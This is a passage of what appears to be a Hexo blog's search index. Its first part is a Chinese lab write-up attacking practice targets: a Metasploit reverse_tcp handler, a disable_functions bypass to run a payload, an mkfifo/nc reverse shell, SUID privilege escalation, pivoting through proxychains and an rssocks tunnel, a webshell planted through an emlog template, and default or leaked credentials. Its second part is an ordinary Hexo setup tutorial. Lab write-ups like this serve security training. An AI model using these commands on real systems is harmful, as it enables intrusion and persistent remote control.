multi/handler</span><br><span class=\"line\"><span class=\"built_in\">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class=\"line\"><span class=\"built_in\">set</span> LHOST 192.168.8.133</span><br><span class=\"line\"><span class=\"built_in\">set</span> lport 13777</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img src=\"n4GA_vC-qtPSBi0tNQ7YIz4oKul6bSpVb9m4rkofi_g.png\" alt=\"image\"></p>\n<h3 id=\"4-2-3成功监听-shell\"><a href=\"#4-2-3成功监听-shell\" class=\"headerlink\" title=\"4.2.3成功监听 shell\"></a>4.2.3成功监听 shell</h3><p>将文件上传到添加执行权限，在目录执行即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.ddd4.com/bypass_disablefunc.php?cmd=<span class=\"built_in\">chmod</span>%20777%20ddd4&amp;outpath=</span><br><span class=\"line\">/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br><span class=\"line\">http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&amp;outpath=/tmp/xx&amp;sopath=</span><br><span class=\"line\">/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>\n<p><img src=\"ZRnQs-_PfinT2HJg3iGZO9Ru6Mic-GN-UcZDxxltjr8.png\" alt=\"image\"></p>\n<p>输入shell</p>\n<p>切换到shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"OblQ59uqbfZF-Ghs5egVLKpWra-wX65xmo7jU_zgOfQ.png\" alt=\"image\"></p>\n<h2 id=\"4-3建立交互shell\"><a href=\"#4-3建立交互shell\" class=\"headerlink\" title=\"4.3建立交互shell\"></a>4.3建立交互shell</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">rm</span> /tmp/f;<span class=\"built_in\">mkfifo</span> /tmp/f;<span class=\"built_in\">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.8.133 9001 &gt;/tmp/f</span><br><span class=\"line\">nc -lvnp 9001</span><br><span class=\"line\">python -c <span class=\"string\">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"XGYye6uVO5tRKailcVLRtiOVW4J_SzZoOhfjjbxwdRg.png\" alt=\"image\"></p>\n<p><img src=\"ntRMyVWHpIB9LvvgQRM0BXo2HAb5skxEaMimR9erkFs.png\" alt=\"image\"></p>\n<p><img src=\"W84iUxb6yI0CvBfPsxEuQDameTh_DYFK8L5_ArnpM0k.png\" alt=\"image\"></p>\n<h2 id=\"4-4查看用户\"><a href=\"#4-4查看用户\" class=\"headerlink\" title=\"4.4查看用户\"></a>4.4查看用户</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>\n<p><img src=\"ak7CkSbwy_pGtg3xG384DwQ5ZxXz1m3lgYd_QkJcsb4.png\" alt=\"image\"></p>\n<h2 id=\"4-5获取第一个flag\"><a href=\"#4-5获取第一个flag\" class=\"headerlink\" title=\"4.5获取第一个flag\"></a>4.5获取第一个flag</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /home/host123/flag.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"uQpRotn6YlxownHCky2IW5sVv5qBdvke5J65kG9f--M.png\" alt=\"image\"></p>\n<h2 id=\"4-6通过宝塔提权到root\"><a href=\"#4-6通过宝塔提权到root\" class=\"headerlink\" title=\"4.6通过宝塔提权到root\"></a>4.6通过宝塔提权到root</h2><p>翻找目录从桌面找到一个敏感文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/home/host123/bt.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"193nUyMLq7yuECV-RrTOZf59ondr6g0KhutLyOr4cCw.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">www@host123:/$ <span class=\"built_in\">cat</span> /home/host123/bt.txt</span><br><span class=\"line\"><span class=\"built_in\">cat</span> /home/host123/bt.txt</span><br><span class=\"line\">Bt-Panel: http://116.27.229.43:8888/944906b5</span><br><span class=\"line\">username: gpeqnjf4</span><br><span class=\"line\">password: d12924fa</span><br></pre></td></tr></table></figure>\n<p>登录地址：<a href=\"http://192.168.8.122:8888/944906b5/\">http://192.168.8.122:8888/944906b5/</a></p>\n<p> </p>\n<p><img src=\"Vqwy9SF04HSPIfBIDyDWzTCjzUxUwZeTnK8WBNDi6Ys.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<p><img src=\"aB6MVs7fb3yF62h5AENtIa-vZ75Hiaae6-_nIEy1z6Q.png\" alt=\"image\"></p>\n<p><img src=\"vtDjFBzclYelUnvE27U_Xs3s3hc01NspAbMY9Uj9cyY.png\" alt=\"image\"></p>\n<p><img src=\"jZ49Y4B5-M__QF2h0WfcWmAPSEopRPkU6q4cnVH4opI.png\" alt=\"image\"></p>\n<h2 id=\"4-6通过-suid-提权到-root\"><a href=\"#4-6通过-suid-提权到-root\" class=\"headerlink\" title=\"4.6通过 suid 提权到 root\"></a>4.6通过 suid 提权到 root</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find / -<span class=\"built_in\">type</span> f -perm -u=s 2&gt;/dev/n</span><br></pre></td></tr></table></figure>\n<p><img src=\"E_HtppmFjm5ClxIHCHclJVNkamT6MdvqDJ1LkU_CRm4.png\" alt=\"image\"></p>\n<p><img src=\"my4Yl5Yv_WExJYO9NATlqjbtGJSWvwZaxyGBreLTBSo.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find inc -<span class=\"built_in\">exec</span> <span class=\"built_in\">whoami</span> \\;</span><br></pre></td></tr></table></figure>\n<p><img src=\"rWhJf-22jquHpwiVzt8t2h9HNLzamN2-pdTPU11Mqbg.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -<span class=\"built_in\">exec</span> /bin/sh -p \\; -quit</span><br></pre></td></tr></table></figure>\n<p><img src=\"B-wQBGGuxmozgBamp_3DxqwaNB0XpC-s96S1ppsN-nM.png\" alt=\"image\"></p>\n<h2 id=\"4-8-linux-三大信息收集脚本的使用和解释\"><a href=\"#4-8-linux-三大信息收集脚本的使用和解释\" class=\"headerlink\" title=\"4.8.linux 三大信息收集脚本的使用和解释\"></a>4.8.linux 三大信息收集脚本的使用和解释</h2><h3 id=\"4-8-1-LinEnum-的使用\"><a href=\"#4-8-1-LinEnum-的使用\" class=\"headerlink\" title=\"4.8.1.LinEnum 的使用\"></a>4.8.1.LinEnum 的使用</h3><p>这个脚本是用来收集系统的信息 如 特殊文件的权限 suid 文件信息 网络端口信息 建立 WEB 服务器 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo python -m SimpleHTTPServer 80 </span><br><span class=\"line\">下载文件执行 wget http://192.168.0.109/LinEnum.sh</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x LinEnum.sh</span><br><span class=\"line\">./ LinEnum.sh</span><br></pre></td></tr></table></figure>\n<p><img src=\"LryINlCXHGFjOd_-Ng5CgUI57nKoIQau4xGDdfMk5eY.png\" alt=\"image\"></p>\n<p><img src=\"Rk9jEKvjkHL9gy66Su_o1O8HwtM66_YevmUiPT9aYi4.png\" alt=\"image\"></p>\n<p>历史记录找到 root 密码 yanisy123</p>\n<h3 id=\"4-8-2-linux-exploit-suggester-sh的使用\"><a href=\"#4-8-2-linux-exploit-suggester-sh的使用\" class=\"headerlink\" title=\"4.8.2.linux-exploit-suggester.sh的使用\"></a>4.8.2.linux-exploit-suggester.sh的使用</h3><p>这个用来检测是否存在提权 cve 漏洞</p>\n<p><img src=\"GUNJi1Ah6o4H2XGwd3R4YEE81ZpXcUvpc0Oi1tLMvV0.png\" alt=\"image\"></p>\n<h3 id=\"4-8-3-linuxprivchecker-py\"><a href=\"#4-8-3-linuxprivchecker-py\" class=\"headerlink\" title=\"4.8.3.linuxprivchecker.py\"></a>4.8.3.linuxprivchecker.py</h3><p>这个用来检测权限</p>\n<p>python linuxprivchecker.py</p>\n<p><img src=\"ANyvx3w5tGYRvOUY4RuK1NoAe7j_pP7rJr4MEvcJ3RU.png\" alt=\"image\"></p>\n<p>su host123</p>\n<p>输入密码之后,查看当前用能执行的命令</p>\n<p>sudo -l</p>\n<p><img src=\"fGMM7Oh19ygjD4aQOWL8zd9u3MzKZQOqADCbM4jUfDU.png\" alt=\"image\"></p>\n<h2 id=\"4-10获取第二个flage\"><a href=\"#4-10获取第二个flage\" class=\"headerlink\" title=\"4.10获取第二个flage\"></a>4.10获取第二个flage</h2><p><img src=\"WewG-lcH9v8y3gmbx52f5ZaDDdlxS9ANnzd2U65oUcU.png\" alt=\"image\"></p>\n<p> </p>\n<p> </p>\n<p> </p>\n<h1 id=\"5-linux-内网跨网段渗透\"><a href=\"#5-linux-内网跨网段渗透\" class=\"headerlink\" title=\"5. linux 内网跨网段渗透\"></a>5. linux 内网跨网段渗透</h1><h1 id=\"5-1-获取高权限的-meterpreter\"><a href=\"#5-1-获取高权限的-meterpreter\" class=\"headerlink\" title=\"5.1.获取高权限的 meterpreter\"></a>5.1.获取高权限的 meterpreter</h1><p>先用 metasploit 反弹一个 root 权限的 meterpreter </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf5 exploit(multi/handler) &gt; exploit -j 放在后台执行</span><br></pre></td></tr></table></figure>\n<p><img src=\"1Rnj75NOP05gZ4dmrsNV2B542Cyag1-zhilPsjyuviM.png\" alt=\"image\"></p>\n<h2 id=\"5-2网卡路由信息获取\"><a href=\"#5-2网卡路由信息获取\" class=\"headerlink\" title=\"5.2网卡路由信息获取\"></a>5.2网卡路由信息获取</h2><p><img src=\"JxPYS0jVwpzXYfLOIh9g94v0m5Q9OPcb7hBDA99B2JI.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run get_local_subnets</span><br></pre></td></tr></table></figure>\n<p><img src=\"-RPTxJgyXwMBb4PUwBF-En3P8ykqs1c9rLLuJKHgmy0.png\" alt=\"image\"></p>\n<h2 id=\"5-3查看-host-文件\"><a href=\"#5-3查看-host-文件\" class=\"headerlink\" title=\"5.3查看 host 文件\"></a>5.3查看 host 文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /etc/hosts</span><br></pre></td></tr></table></figure>\n<p><img src=\"AU2gQldA4OxBrzii6khdMjzwRokEpairfJcdiIoDGjw.png\" alt=\"image\"></p>\n<h2 id=\"5-4metasploit-设置代理进入内网\"><a href=\"#5-4metasploit-设置代理进入内网\" class=\"headerlink\" title=\"5.4metasploit 设置代理进入内网\"></a>5.4metasploit 设置代理进入内网</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>\n<p><img src=\"dizUR8OjjOoSdxmLgwzZJihQ784RaXj_v_4NLgVme-Y.png\" alt=\"image\"></p>\n<h3 id=\"5-4-1启动-socks-模块\"><a href=\"#5-4-1启动-socks-模块\" class=\"headerlink\" title=\"5.4.1启动 socks 模块\"></a>5.4.1启动 socks 模块</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\"><span class=\"built_in\">set</span> SRVPORT 22333</span><br></pre></td></tr></table></figure>\n<p><img src=\"kNJhTAXsZ69uNVFcJE92Quk-37iXY_JwgEgaBQF283Y.png\" alt=\"image\"></p>\n<p>启动代理</p>\n<p><img src=\"mwM2koYg9Vl38le3S_Nl-SVcBYEg56jChEYNFp6KkrM.png\" alt=\"image\"></p>\n<h3 id=\"5-4-2设置-proxychains-代理进内网\"><a href=\"#5-4-2设置-proxychains-代理进内网\" class=\"headerlink\" title=\"5.4.2设置 proxychains 代理进内网\"></a>5.4.2设置 proxychains 代理进内网</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"mGR-GyYQWjXUemmzMDdDn1yDULJ8REU_E2NeQqmZYZ4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains nmap -sT -Pn 10.10.10.144</span><br></pre></td></tr></table></figure>\n<p><img src=\"KY5ot2xwFry1zm9drgKvP3gdXwMWVF7JDQ-UrEpDLsk.png\" alt=\"image\"></p>\n<h2 id=\"5-5对-www-ddd5-com-进行检测\"><a href=\"#5-5对-www-ddd5-com-进行检测\" class=\"headerlink\" title=\"5.5对 www.ddd5.com 进行检测\"></a>5.5对 <a href=\"http://www.ddd5.com/\">www.ddd5.com</a> 进行检测</h2><p>Kali中添加hosts  </p>\n<p><img src=\"8H8zIyTCZzTeWCyFi6I3Pb_WVvjodkLj0ZMOOz9fcpw.png\" alt=\"image\"></p>\n<h3 id=\"5-5-1-设置浏览器代理访问\"><a href=\"#5-5-1-设置浏览器代理访问\" class=\"headerlink\" title=\"5.5.1.设置浏览器代理访问\"></a>5.5.1.设置浏览器代理访问</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains firefox http://www.ddd5.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"OrnTY80CSPRY9sWj3_m6BUHORlRdwSwtUTYPIdN0rao.png\" alt=\"image\"></p>\n<p><img src=\"W2JDhK2kET5UvzycAo-RMf7ZIa8Wci0YZl12Gz9LvAM.png\" alt=\"image\"></p>\n<p>发现是 emlog 后台默认密码 123456 即可登录。</p>\n<p>Msf的代理不够稳定，我们自己搭建一个代理来访问。</p>\n<p>Kali上操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar zxvf ssocks-0.0.14.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ssocks-0.0.14</span><br><span class=\"line\">./configure &amp;&amp; make</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /src</span><br><span class=\"line\">./rcsocks -l 2233 -p 1080 -vv</span><br></pre></td></tr></table></figure>\n\n\n<p>受害机操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar zxvf ssocks-0.0.14.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ssocks-0.0.14</span><br><span class=\"line\">./configure &amp;&amp; make</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /src</span><br><span class=\"line\">./rssocks -vv -s 192.168.8.133:1080</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"p4fsTV-T-xpzjQ_bZ_yovuAg9wFToDyqwvU_RERHQ_g.png\" alt=\"image\"></p>\n<p> </p>\n<h3 id=\"5-5-2后台拿-WEBSHELL\"><a href=\"#5-5-2后台拿-WEBSHELL\" class=\"headerlink\" title=\"5.5.2后台拿 WEBSHELL\"></a>5.5.2后台拿 WEBSHELL</h3><p>从网上下来一个 emlog 把带有后门文件的 php 设置打包好在 emlog 后台上传模板压缩包解压后即可在模板名的目录生成一个 php 后门。</p>\n<p><img src=\"7i2yD6iFayLLQFLXzLGQpQq7C4vWY12Ie9mFyMz1hIk.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">www.ddd5.com/content/templates/moonsec/moon.php</span><br><span class=\"line\">www.ddd5.com/content/templates/moonsec/shell.php</span><br><span class=\"line\">www.ddd5.com/content/templates/moonsec/1.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"PcKOwqOF0AOraUUKv_g5mgriiSJvrtSSH0q5HUi0gKs.png\" alt=\"image\"></p>\n<p> </p>\n<p><img src=\"qQ2ydqInvynsfxU-i12XG7GS9AhrXV0J304plvCL2no.png\" alt=\"image\"></p>\n<p><img src=\"R9x92PTRDy2p-J-ws2302wLWv4048v47GsxGn6pRT-0.png\" alt=\"image\"></p>\n<p>中国蚁剑设置代理连接</p>\n<p><img src=\"nln8xWQk8lshZ3k8T71ic4C-V6eEILztDJ4cUp2FMFs.png\" alt=\"image\"></p>\n<h1 id=\"6-linux-内网跨网段提权\"><a href=\"#6-linux-内网跨网段提权\" class=\"headerlink\" title=\"6.linux 内网跨网段提权\"></a>6.linux 内网跨网段提权</h1><h2 id=\"6-1wdcp主机提权\"><a href=\"#6-1wdcp主机提权\" class=\"headerlink\" title=\"6.1wdcp主机提权\"></a>6.1wdcp主机提权</h2><p>访问地址：10.10.10.144:8080&#x2F;phpMyAdmin</p>\n<p><img src=\"PEJ7gJoadiufgS6l7KCbQj6oiIuX6qU0brKxyXhtN0M.png\" alt=\"image\"></p>\n<p>输入账号：root  密码：wdlinux.cn</p>\n<p>登录成功</p>\n<p><img src=\"KZvBLHYyKqRm7pii6bQ29Y93wWQjIPbpkPXRt9GaUzQ.png\" alt=\"image\"></p>\n<p>Echo -n 123456 | md5sum</p>\n<p> </p>\n<p><img src=\"VYze8T5MpfU6n-z0YJp79B6759o5sOZurVzYvVyy7NA.png\" alt=\"image\"></p>\n<p>使用修改后的密码：123456，登录成功(如果一直登录不上，可能是运行web的系统的时间和本机的时间不一致)</p>\n<p><img src=\"2DOrDq8gNrsjL87Ahm6PD89vQm4DufrOw1ql2DjCtls.png\" alt=\"image\"></p>\n<p> </p>\n<p><img src=\"RCH3_E6R45eT4MJj0esLf6JN0VHdzlGPeszMcHJYrAI.png\" alt=\"image\"></p>\n<p>生成密钥</p>\n<p><img src=\"4rRuEMZ_HorDIkEdLJjknTY-X48iQYCzy7IgMyX3SM8.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">在 kali 设置权限 600 proxychains ssh root@10.10.10.144 -i sshkey_wdcp</span><br></pre></td></tr></table></figure>\n","categories":["打靶日记（moon）"],"tags":["红队","域渗透","打点"]},{"title":"搭建Hexo博客","url":"/2020/02/28/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/","content":"<h1 id=\"搭建Hexo博客\"><a href=\"#搭建Hexo博客\" class=\"headerlink\" title=\"搭建Hexo博客\"></a>搭建Hexo博客</h1><h2 id=\"Hexo简介\"><a href=\"#Hexo简介\" class=\"headerlink\" title=\"Hexo简介\"></a>Hexo简介</h2><p>Hexo是一个基于 node.js的快速生成静态博客的开源框架，支持 Markdown和大多数 Octopress插件，一个命令即可部署到 Github页面、 Giteee、 Heroku等，强大的APl，可无限扩，拥有数百个主题和插件。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><h3 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"安装Node.js\"></a>安装Node.js</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Node.js的版本需要不低于<span class=\"number\">10.13</span>，建议使用Node.js <span class=\"number\">12.0</span>及以上版本。</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">从Git的官网选择相应的系统下载安装Git</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h2><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中输入如下命令</span><br><span class=\"line\">npm install -g hexo-cli</span><br><span class=\"line\">#mac</span><br><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n<p>安装好后，可以输入<code>hexo -v</code>查看版本</p>\n<p><img src=\"97EVbDOVkyTC0he6iCBF8JU5xg5-16f3su45CJgDLDA.png\" alt=\"image\"></p>\n<h3 id=\"初始化Hexo\"><a href=\"#初始化Hexo\" class=\"headerlink\" title=\"初始化Hexo\"></a>初始化Hexo</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 按个人习惯，在某个盘符建立存储博客的文件夹。</span><br><span class=\"line\"># 首先需要在cmd中切换到相应的文件夹中，然后再输入如下命令。（其中hexoblog为存储博客的文件夹名）；会在当前目录下创建一个hexoblog文件夹</span><br><span class=\"line\">hexo init hexoblog</span><br></pre></td></tr></table></figure>\n<p><img src=\"T97hTLA9FRaqFeRUcaQbtr1V2RvzgtfauZyNwdzlAbI.png\" alt=\"image\"></p>\n<h3 id=\"npm的安装\"><a href=\"#npm的安装\" class=\"headerlink\" title=\"npm的安装\"></a>npm的安装</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 首先进入到存储博客的文件夹中。</span><br><span class=\"line\">cd hexoblog</span><br><span class=\"line\"># 然后安装npm</span><br><span class=\"line\">sudo npm install</span><br></pre></td></tr></table></figure>\n<p><img src=\"zygyREOvvqKBvEJ3BoVZUoUyEoJNi_jb3Jrp9QKljAA.png\" alt=\"image\"></p>\n<p>至此，Hexo本地站点就已安装好了，接下来就可以让它在本地跑起来。</p>\n<h3 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 在cmd中依次输入以下命令</span><br><span class=\"line\"># 生成静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 启动服务</span><br><span class=\"line\">hexo server</span><br></pre></td></tr></table></figure>\n<p>访问网址：<a href=\"http://localhost:4000/%EF%BC%8C%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E7%9A%84Hexo%E4%BA%86\">http://localhost:4000/，就能看到本地搭建的Hexo了</a></p>\n<h2 id=\"更换主题\"><a href=\"#更换主题\" class=\"headerlink\" title=\"更换主题\"></a>更换主题</h2><h3 id=\"git下载主题\"><a href=\"#git下载主题\" class=\"headerlink\" title=\"git下载主题\"></a>git下载主题</h3><p>在hexo目录下的themes文件夹下打开git bash，输入以下命令，下载主题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/probberechts/hexo-theme-cactus.git</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"52mRukbLvXFYULRC4L1eQq07YOky_q3bG8bepR2kKsQ.png\" alt=\"image\"></p>\n<h3 id=\"配置-config-yml文件\"><a href=\"#配置-config-yml文件\" class=\"headerlink\" title=\"配置_config.yml文件\"></a>配置_config.yml文件</h3><p>打开hexo目录下的_config.yml文件，修改theme，注意冒号之后的空格。</p>\n<p>因为刚刚已经下载过主题，打开hexo目录下的themes文件夹会看到新生成的主题文件夹，将他的名字复制到_config.yml里并保存。</p>\n<p>（ps：注意hexo和themes的主题文件夹里各有一个_config.yml文件，不要搞混了，后续增加各种效果还需要用到的）</p>\n<p><img src=\"ifBnRSYs__7QeZYyKL0I0FSRwVYYLpWBnS-Q7umI2i8.png\" alt=\"image\"></p>\n<p><img src=\"imeJgzdY9zScz98N0PiBDxRsB05qu1ysdq-89-TZrNU.png\" alt=\"image\"></p>\n<h3 id=\"更新主题\"><a href=\"#更新主题\" class=\"headerlink\" title=\"更新主题\"></a>更新主题</h3><p>在hexo目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  #相当于 启动服务 hexo server</span><br></pre></td></tr></table></figure>\n<p>感觉效果满意就可以部署到GitHub上了</p>\n<p>在hexo目录下，打开git bash，输入以下命令，清除缓存，将内容部署到GitHub</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">#推送到gitee</span><br><span class=\"line\">hexo g -d</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"将博客部署到Github上\"><a href=\"#将博客部署到Github上\" class=\"headerlink\" title=\"将博客部署到Github上\"></a>将博客部署到Github上</h2><h3 id=\"新建仓库\"><a href=\"#新建仓库\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>登录我们的 github，新建一个仓库</p>\n<p><img src=\"0v2bqa22w3g6HeZccv32X_u7LXW_n0i0sCddPazNlvM.png\" alt=\"image\"></p>\n<h3 id=\"创建SSH-key\"><a href=\"#创建SSH-key\" class=\"headerlink\" title=\"创建SSH key\"></a>创建SSH key</h3><p>首先要重新在git设置一下身份的名字和邮箱；删除.ssh文件夹</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;username&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;xxxxxx@163.com&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在 git bash here 中创建一个ssh密钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">指令：<span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;邮箱&quot;</span>  <span class=\"comment\">#此处邮箱填写自己的邮箱</span></span><br></pre></td></tr></table></figure>\n<p>然后enter三连</p>\n<p>生成两个文件： id_rsa和id_rsa.pub 存放在文件夹下(window在：C:\\Users\\admin.ssh)</p>\n<p><img src=\"wnQoPpO2kycVmCJhdEhht-SCiEBHi0WEiEbE0hHJPG4.png\" alt=\"image\"></p>\n<p>在GitHub的设置里面创建一个ssh密钥.</p>\n<ul>\n<li>Title：随意填写</li>\n<li>Key：将本地的id_rsa.pub文件用记事本打开，复制全部内容粘贴到GitHub仓库的SSH Keys 位置</li>\n</ul>\n<p><img src=\"V9Kd_L68wDccwrfOZyOQGryDAxrpggeIdN0wzYcBvDw.png\" alt=\"image\"></p>\n<p>添加成功</p>\n<p><img src=\"bCEtDFcgCvXHlAAPry1CFOVdrRKABpYF43exvckkHo0.png\" alt=\"image\"></p>\n<h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 这里需要先安装deployer-git插件</span><br><span class=\"line\">sudo npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"Pog-PLHcf3Aq0PF995VZXKmcj-TG232MclF1K0vCKXA.png\" alt=\"image\"></p>\n<p>安装完成 git 部署插件后，需要设置下 blogs文件夹下的 _config.yml 这个文件</p>\n<p>修改文件的 Deployment 部分,</p>\n<p>安装完成上述的deployer-git插件之后，设置项目文件夹下的_config.yml 文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: https:<span class=\"comment\">//github.com/Garckz/Garckz.github.io</span></span><br><span class=\"line\">  branch: master</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">新版本写法：</span><br><span class=\"line\">branch需要使用mian</span><br><span class=\"line\"></span><br><span class=\"line\">SSH写法：</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: git<span class=\"meta\">@github</span>.com:Garckz/Garckz.github.io.git</span><br><span class=\"line\">  branch: main</span><br></pre></td></tr></table></figure>\n<p><img src=\"LrR_MSFKobBTeJlV3KL918TSypDaSe0lAUh77Y-vgp0.png\" alt=\"image\"></p>\n<p><strong>切记：分支branch切记修改为 main，之前github的默认主分支为master，现已经改为main</strong> ！！！</p>\n<h3 id=\"上传到Github\"><a href=\"#上传到Github\" class=\"headerlink\" title=\"上传到Github\"></a>上传到Github</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 清理</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\"># 构建静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 上传到仓库</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n<p><img src=\"nMpLWIMDazitLVGFeolbJPbfyNlO3_uxV6_A17cZKPY.png\" alt=\"image\"></p>\n<h2 id=\"将博客部署到Gitee上\"><a href=\"#将博客部署到Gitee上\" class=\"headerlink\" title=\"将博客部署到Gitee上\"></a>将博客部署到Gitee上</h2><h3 id=\"新建仓库-1\"><a href=\"#新建仓库-1\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>在Gitee上新建一个用来存放博客的仓库，此处需要特别注意路径的填写。</p>\n<p><img src=\"KHyjTbtqtZOVzQr1e2aluRYqGRh9hawoLDSAwG7YmQ0.png\" 